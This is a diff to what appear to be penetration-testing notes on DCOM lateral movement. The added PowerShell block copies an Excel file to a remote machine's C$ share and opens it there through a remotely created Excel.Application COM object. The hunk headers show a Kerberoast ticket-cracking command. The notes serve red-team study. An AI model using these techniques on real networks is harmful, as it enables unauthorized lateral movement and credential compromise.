@@ -2293,10 +2293,10 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <TGS ticketFile>
       - [[https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/][lateral movement using outlooks]]
       - [[https://attactics.org/2018/02/dcom-lateral-movement-powerpoint/][lateeral movement with PowerPoint and dcom]]
 
-    + src: TODO
+    + src-local: 
     #+begin_src powershell
       ## first, instantiate the com object and list its available methods.
-    $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+    $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "localhost"))
         ## System.Activator class, CreateInstance(Type type)
         ## [[https://msdn.microsoft.com/en-us/library/wccyzw83(v=vs.110).aspx]]
         ## the "progID" format: <Program>.<Component>.<Version>
@@ -2328,6 +2328,21 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <TGS ticketFile>
       - tools:
         - dcomcnfg.exe
         - [[https://github.com/tyranid/oleviewdotnet][OleView.exe]]
+
+    + src-remote:
+    #+begin_src
+$rHost = "10.0.10.2"
+$LocalPath = "C:\conf.xls" 
+$RemotePath = "\\$rHost\c$\conf.xls" 
+  # access the remote file system through smb
+[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", $rHost)) 
+$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+  # open the file on remote computer
+
+    #+end_src
+
     
 
 * TODO list
